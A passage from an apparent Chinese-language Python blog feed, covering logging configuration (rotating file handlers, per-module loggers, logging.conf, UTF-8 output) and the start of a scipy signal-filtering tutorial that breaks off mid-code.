class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">logging.basicConfig(filename=<span class="string">'log.log'</span>,format=LOG_FORMAT,level=logging.DEBUG)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/5_%E6%97%A5%E5%BF%97%E6%89%93%E5%8D%B0%E5%88%B0%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.png" alt="输出到日志文件中"><br>输出到日志文件<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/6_%E8%BE%93%E5%87%BA%E5%88%B0%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%95%88%E6%9E%9C.png" alt="输出到日志文件效果"><br>将日志输出到日志文件，如果是日志量非常大，在实际生产环境经常碰到的是要对日志文件进行分隔，根据日志文件的大小或日期来分割生成多个日志文件。<br>这里介绍通过日志文件大小分割和通过日期来分割日志文件。</p><h4 id="1-通过日志文件大小分割"><a href="#1-通过日志文件大小分割" class="headerlink" title="1.通过日志文件大小分割"></a>1.通过日志文件大小分割</h4><p>RotatingFileHandler<br>日志记录到文件中，且支持指定日志文件大小，备份文件数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.handlers.RotatingFileHandler(filename, mode=<span class="string">'a'</span>, maxBytes=<span class="number">0</span>, backupCount=<span class="number">0</span>, encoding=<span class="literal">None</span>, delay=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>maxBytes：日志文件大小，单位为字节<br>backupCount：备份文件数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">rfh=logging.handlers.RotatingFileHandler(filename=<span class="string">'log.log'</span>,encoding=<span class="string">'UTF-8'</span>, maxBytes=<span class="number">1024</span>, backupCount=<span class="number">2</span>)</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh])</span><br></pre></td></tr></table></figure><p>这里设置的是当文件超过1024bytes就会对文件进行分割，备份文件数量为2，得到log.log.1、log.log.2，当log.log.2写满时又回循环写到log.log中。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/7_%E6%A0%B9%E6%8D%AE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E5%BE%AA%E7%8E%AF%E5%88%87%E5%89%B2%E7%94%9F%E6%88%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.png" alt="根据日志文件大小循环切割生成日志文件"></p><h4 id="2-通过日期来分割日志文件"><a href="#2-通过日期来分割日志文件" class="headerlink" title="2.通过日期来分割日志文件"></a>2.通过日期来分割日志文件</h4><p>TimedRotatingFileHandler<br>日志记录到文件中，支持按时间间隔来更新日志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.handlers.TimedRotatingFileHandler(filename, when=<span class="string">'h'</span>, interval=<span class="number">1</span>, backupCount=<span class="number">0</span>, encoding=<span class="literal">None</span>, delay=<span class="literal">False</span>, utc=<span class="literal">False</span>, atTime=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>指定的文件会被打开并用作日志记录的流。 对于轮换操作它还会设置文件名前缀。 轮换的发生是基于 when 和 interval 的积。<br>你可以使用 when 来指定 interval 的类型。 可能的值列表如下。 请注意它们不是大小写敏感的。</p><table><thead><tr><th>值</th><th>间隔类型</th><th>如果/如何使用 atTime</th></tr></thead><tbody><tr><td>‘S’</td><td>秒</td><td>忽略</td></tr><tr><td>‘M’</td><td>分钟</td><td>忽略</td></tr><tr><td>‘H’</td><td>小时</td><td>忽略</td></tr><tr><td>‘D’</td><td>天</td><td>忽略</td></tr><tr><td>‘W0’-‘W6’</td><td>工作日(0=星期一)</td><td>用于计算初始轮换时间</td></tr><tr><td>‘midnight’</td><td>如果未指定 atTime 则在午夜执行轮换，否则将使用 atTime。</td><td>用于计算初始轮换时间</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> RotatingFileHandler</span><br><span class="line"></span><br><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">tfh=logging.handlers.TimedRotatingFileHandler(<span class="string">'tfh_log.log'</span>, when=<span class="string">'S'</span>, interval=<span class="number">1.5</span>, backupCount=<span class="number">2</span>, encoding=<span class="string">'UTF-8'</span>, delay=<span class="literal">False</span>, utc=<span class="literal">False</span>, atTime=time)</span><br><span class="line">rfh=logging.handlers.RotatingFileHandler(filename=<span class="string">'log.log'</span>,encoding=<span class="string">'UTF-8'</span>, maxBytes=<span class="number">1024</span>, backupCount=<span class="number">2</span>)</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh,tfh])</span><br></pre></td></tr></table></figure><p>为了演示方便，这里when=’S’, interval=1.5 即1.5秒循环生成一个日志文件。在实际生产环境一般根据日志量的大小，可以配置成每天生成一个日志文件。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/8_%E6%A0%B9%E6%8D%AE%E6%97%A5%E6%9C%9F%E5%88%87%E5%89%B2%E7%94%9F%E6%88%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.png" alt="通过日期来分割日志文件"></p><h3 id="5、既生成日志文件又在控制台打印日志"><a href="#5、既生成日志文件又在控制台打印日志" class="headerlink" title="5、既生成日志文件又在控制台打印日志"></a>5、既生成日志文件又在控制台打印日志</h3><p>有时候为了调试方便，还是想在控制台打印日志。能不能既生成日志文件又在控制台打印日志呢？通过配置logging的StreamHandler也是可以做到的。<br>StreamHandler<br>StreamHandler 类位于核心 logging 包，它可将日志记录输出发送到数据流例如 sys.stdout, sys.stderr 或任何文件类对象（或者更精确地说，任何支持 write() 和 flush() 方法的对象）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh=logging.StreamHandler()</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh,tfh,sh])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/9_%E6%97%A2%E7%94%9F%E6%88%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%88%E5%9C%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97.png" alt="既生成日志文件又在控制台打印日志"></p><h3 id="6、多个模块中记录日志"><a href="#6、多个模块中记录日志" class="headerlink" title="6、多个模块中记录日志"></a>6、多个模块中记录日志</h3><p>在实际项目使用过程中，一个好的实践是将日志配置的模块封装好成为一个通用的日志模块组件，可以给项目中所有的模块使用。<br>这里我们将配置好的日志logging从main.py中抽出来形成一个logutils.py的通用模块，其他模块就可以使用了<br><strong>logutils.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> RotatingFileHandler</span><br><span class="line"></span><br><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">tfh=logging.handlers.TimedRotatingFileHandler(<span class="string">'tfh_log.log'</span>, when=<span class="string">'S'</span>, interval=<span class="number">1.5</span>, backupCount=<span class="number">2</span>, encoding=<span class="string">'UTF-8'</span>, delay=<span class="literal">False</span>, utc=<span class="literal">False</span>, atTime=time)</span><br><span class="line">rfh=logging.handlers.RotatingFileHandler(filename=<span class="string">'log.log'</span>,encoding=<span class="string">'UTF-8'</span>, maxBytes=<span class="number">1024</span>, backupCount=<span class="number">2</span>)</span><br><span class="line">sh=logging.StreamHandler()</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh,tfh,sh])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/10_logutils.png" alt="公共日志模块"></p><p>如在othermodule.py中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestModule</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self)</span>:</span></span><br><span class="line">        logging.info(<span class="string">'this is TestModule.print_log() info'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log_staic</span><span class="params">()</span>:</span></span><br><span class="line">        logging.info(<span class="string">'this is TestModule.print_log_staic info'</span>)</span><br></pre></td></tr></table></figure><p>在main.py中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> othermodule <span class="keyword">import</span> TestModule</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logging.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logging.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logging.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logging.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logging.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br><span class="line">    TestModule.print_log_staic() <span class="comment">#类方法中打印日志</span></span><br><span class="line">    testModule=TestModule()</span><br><span class="line">    testModule.print_log()  <span class="comment">#实例方法中打印日志</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/11_%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%97%A5%E5%BF%97.png" alt="其他模块中显示日志"></p><p>项目工程中所有的模块只要通过 <code>from logutils import logging</code> 引入logging就可以使用配置好的logging记录日志了。</p><h3 id="7、每个不同的模块使用不同的日志记录器记录日志"><a href="#7、每个不同的模块使用不同的日志记录器记录日志" class="headerlink" title="7、每个不同的模块使用不同的日志记录器记录日志"></a>7、每个不同的模块使用不同的日志记录器记录日志</h3><p>现在我们在所有的模块中都是用的默认的root记录器来记录的日志，实际上也可以让每个不同的模块使用不同的日志记录器记录日志。<br>日志事件信息在 LogRecord 实例中的记录器、处理器、过滤器和格式器之间传递。<br>通过调用 Logger 类（以下称为 loggers ， 记录器）的实例来执行日志记录。<br>在命名记录器时使用的一个好习惯是在每个使用日志记录的模块中使用模块级记录器，命名如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger = logging.getLogger(__name__)</span><br></pre></td></tr></table></figure><p>这意味着记录器名称跟踪包或模块的层次结构，并且直观地从记录器名称显示记录事件的位置。<br>记录器层次结构的根称为根记录器。 这是函数 debug() 、 info() 、 warning() 、 error() 和 critical() 使用的记录器，它们就是调用了根记录器的同名方法。 函数和方法具有相同的签名。 根记录器的名称在输出中打印为 ‘root’ 。<br>实际上我们只要通过 <code>logger = logging.getLogger(__name__)</code> 给每个模块定义一个记录器就可以了。<br><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> othermodule <span class="keyword">import</span> TestModule</span><br><span class="line">logger=logging.getLogger(__name__)  <span class="comment">#定义模块日志记录器</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logger.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logger.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logger.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logger.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logger.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br><span class="line">    TestModule.print_log_staic() <span class="comment">#类方法中打印日志</span></span><br><span class="line">    testModule=TestModule()</span><br><span class="line">    testModule.print_log()  <span class="comment">#实例方法中打印日志</span></span><br></pre></td></tr></table></figure><p><strong>othermodule.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line">logger=logging.getLogger(__name__) <span class="comment">#定义模块日志记录器</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestModule</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self)</span>:</span></span><br><span class="line">        logger.info(<span class="string">'this is TestModule.print_log() info'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log_staic</span><span class="params">()</span>:</span></span><br><span class="line">        logger.info(<span class="string">'this is TestModule.print_log_staic info'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/12_%E6%AF%8F%E4%B8%AA%E4%B8%8D%E5%90%8C%E7%9A%84%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%99%A8%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97.png" alt="每个不同的模块使用不同的日志记录器记录日志"><br>可以看到模块日志记录器打印出来的日志中模块名不再是默认的root，而是各自的模块名。</p><h3 id="8、通过配置文件配置日志记录器"><a href="#8、通过配置文件配置日志记录器" class="headerlink" title="8、通过配置文件配置日志记录器"></a>8、通过配置文件配置日志记录器</h3><p>在实际项目应用的过程中，通常通过配置文件来配置日志记录器的各种配置，这样的好处就是改变日志记录的配置不需要修改代码，直接修改配置文件就可以了。<br>接下来介绍如何通过配置文件配置logging日志记录器<br>新建 logging.conf 配置文件，通过如下配置将前面代码中的处理器，日志记录器，通过配置文件的方式配置好。<br> <strong>logging.conf</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[loggers]</span><br><span class="line">keys=root,logger01</span><br><span class="line"></span><br><span class="line">[logger_root]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=sh</span><br><span class="line"></span><br><span class="line">[logger_logger01]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=sh,tfh,rfh</span><br><span class="line">qualname=logger01</span><br><span class="line">propagate=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">[handlers]</span><br><span class="line">keys=sh,tfh,rfh</span><br><span class="line"></span><br><span class="line">[handler_sh]</span><br><span class="line">class=StreamHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(sys.stderr,)</span><br><span class="line"></span><br><span class="line">[handler_tfh]</span><br><span class="line">class=handlers.TimedRotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'tfh_log.log'</span>,<span class="string">'S'</span>,<span class="number">1.5</span>,<span class="number">2</span>,)</span><br><span class="line"></span><br><span class="line">[handler_rfh]</span><br><span class="line">class=handlers.RotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'log.log'</span>,<span class="string">'a'</span>,<span class="number">1024</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">[formatters]</span><br><span class="line">keys=form01</span><br><span class="line"></span><br><span class="line">[formatter_form01]</span><br><span class="line">format=%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s</span><br></pre></td></tr></table></figure><p>在logutils.py中应用配置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line">logging.config.fileConfig(<span class="string">"logging.conf"</span>)</span><br></pre></td></tr></table></figure><p>logutils.py中的代码就异常简单了，应为原来通过代码实现的配置，都写到了logging.conf配置文件中了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/12_%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%BB%A3%E7%A0%81%E4%B8%AD%E4%B8%80%E6%A0%B7%E7%9A%84%E5%8A%9F%E8%83%BD.png" alt="配置文件实现了日志代码中的功能"></p><p>这里要注意的是，在应用日志记录器的时候，需要引用配置文件中配置的记录器，如配置文件中配置了root和logger01，在应用的时候可以引用这两个记录器，当然也可以在配置文件中配置更多的记录器。<br>在mian.py和othermodule.py中应用日志记录器的时候，需要注意记录器用要配置文件中定义的记录器，这里是logger01。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger=logging.getLogger(<span class="string">'logger01'</span>)  <span class="comment">#定义模块日志记录器</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/13_%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0%E6%95%88%E6%9E%9C%E5%BC%95%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%99%A8.png" alt="定义模块日志记录器"></p><h3 id="8、日志中中文显示"><a href="#8、日志中中文显示" class="headerlink" title="8、日志中中文显示"></a>8、日志中中文显示</h3><p>当日志信息中有中文的时候，在控制台输出会自动的转码，但有时在文件输出的时候会出现乱码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/14_%E4%B8%AD%E6%96%87%E4%BF%A1%E6%81%AF%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E6%B2%A1%E9%97%AE%E9%A2%98.png" alt="中文信息控制台输出没有问题"></p><p>控制台输出中文，但日志文件中是乱码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/15_%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%B8%AD%E4%B9%B1%E7%A0%81.png" alt="日志文件中是乱码"></p><p>对照python官方说明文档设置编码，设置处理器的编码为UTF-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[handler_tfh]</span><br><span class="line">class=handlers.TimedRotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'tfh_log.log'</span>,<span class="string">'S'</span>,<span class="number">1.5</span>,<span class="number">2</span>,<span class="string">'UTF-8'</span>)</span><br><span class="line"></span><br><span class="line">[handler_rfh]</span><br><span class="line">class=handlers.RotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'log.log'</span>,<span class="string">'a'</span>,<span class="number">1024</span>,<span class="number">2</span>,<span class="string">'UTF-8'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/16_%E8%AE%BE%E7%BD%AE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0.png" alt="配置文件的参数"><br>现在重新执行main.py，可以看到日志文件中可以正常显示中文。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/17_%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87.png" alt="日志文件显示中文"></p><p>至此，我们从一个简单的日志记录实战，一步一步实现了自定义日志格式、写日志文件、抽出公共日志模块让其他模块用、同时写多个日志文件并进行日志文件切割、通过配置文件实现日志参数的定义、解决日志中文显示问题。基本覆盖了真实应用场景日志的使用。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现简单信号滤波实战</title>
      <link href="/posts/3918ce28/"/>
      <url>/posts/3918ce28/</url>
      
        <content type="html"><![CDATA[<p>在有些项目中需要对信号进行滤波处理，尤其是在医疗的设备中如心跳、脉搏等设备的采样后进行处理。滤波的目的就是除去某些频率的信号如噪声。常见的包括有低通滤波、高通滤波、带通滤波。</p><p>低通滤波指的是去除高于某一阈值频率的信号；高通滤波去除低于某一频率的信号；带通滤波指的是类似低通高通的结合保留中间频率信号；带阻滤波也是低通高通的结合只是过滤掉的是中间部分。通过滤波可以过滤到一些无用的噪音，得到的比较平滑的波形，用来进行分析。</p><p>scipy模块提供了常用简单的信号滤波方法包括低通滤波、高通滤波、带通滤波、带阻滤波等。</p><h2 id="一、scipy信号滤波函数介绍"><a href="#一、scipy信号滤波函数介绍" class="headerlink" title="一、scipy信号滤波函数介绍"></a>一、scipy信号滤波函数介绍</h2><ol><li>滤波器构造函数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scipy.signal.butter(N, Wn, btype=<span class="string">'low'</span>, analog=<span class="literal">False</span>, output=<span class="string">'ba'</span>)</span><br></pre></td></tr></table></figure><p> 输入参数：<br> N:滤波器的阶数<br> Wn：归一化截止频率。计算公式Wn=2*截止频率/采样频率。（注意：根据采样定理，采样频率要大于两倍的信号本身最大的频率，才能还原信号。截止频率一定小于信号本身最大的频率，所以Wn一定在0和1之间）。当构造带通滤波器或者带阻滤波器时，Wn为长度为2的列表。<br> btype : 滤波器类型{‘lowpass’, ‘highpass’, ‘bandpass’, ‘bandstop’},<br> output : 输出类型{‘ba’, ‘zpk’, ‘sos’},<br> 输出参数：<br> b，a: IIR滤波器的分子（b）和分母（a）多项式系数向量。output=’ba’<br> z,p,k: IIR滤波器传递函数的零点、极点和系统增益. output= ‘zpk’<br> sos: IIR滤波器的二阶截面表示。output= ‘sos’</p><ol start="2"><li>滤波函数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scipy.signal.filtfilt(b, a, x, axis=<span class="number">-1</span>, padtype=<span class="string">'odd'</span>, padlen=<span class="literal">None</span>, method=<span class="string">'pad'</span>, irlen=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p> 输入参数：<br> b: 滤波器的分子系数向量<br> a: 滤波器的分母系数向量<br> x: 要过滤的数据数组。（array型）<br> axis: 指定要过滤的数据数组x的轴<br> padtype: 必须是“奇数”、“偶数”、“常数”或“无”。这决定了用于过滤器应用的填充信号的扩展类型。{‘odd’, ‘even’, ‘constant’, None}<br> padlen：在应用滤波器之前在轴两端延伸X的元素数目。此值必须小于要滤波元素个数- 1。（int型或None）<br> method：确定处理信号边缘的方法。当method为“pad”时，填充信号；填充类型padtype和padlen决定，irlen被忽略。当method为“gust”时，使用古斯塔夫森方法，而忽略padtype和padlen。{“pad” ，“gust”}<br> irlen：当method为“gust”时，irlen指定滤波器的脉冲响应的长度。如果irlen是None，则脉冲响应的任何部分都被忽略。对于长信号，指定irlen可以显著改善滤波器的性能。（int型或None）<br> 输出参数：<br> y:滤波后的数据数组</p><h2 id="二、代码介绍"><a href="#二、代码介绍" class="headerlink" title="二、代码介绍"></a>二、代码介绍</h2><p>scipy模块signal滤波器类型包括低通滤波、高通滤波、带通滤波、带阻滤波</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pip install scipy</span><br><span class="line"><span class="comment">#低通滤波</span></span><br><span class="line"><span class="comment">#假设采样频率为1000hz,信号本身最大的频率为500hz，要滤除400hz以上频率成分，即截至频率为400hz,则wn=2*400/1000=0.8。Wn=0.8</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, <span class="number">0.8</span>, <span class="string">'lowpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line"><span class="comment">#高通滤波</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, <span class="number">0.2</span>, <span class="string">'highpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line"><span class="comment">#带通滤波</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, [<span class="number">0.2</span>,<span class="number">0.8</span>], <span 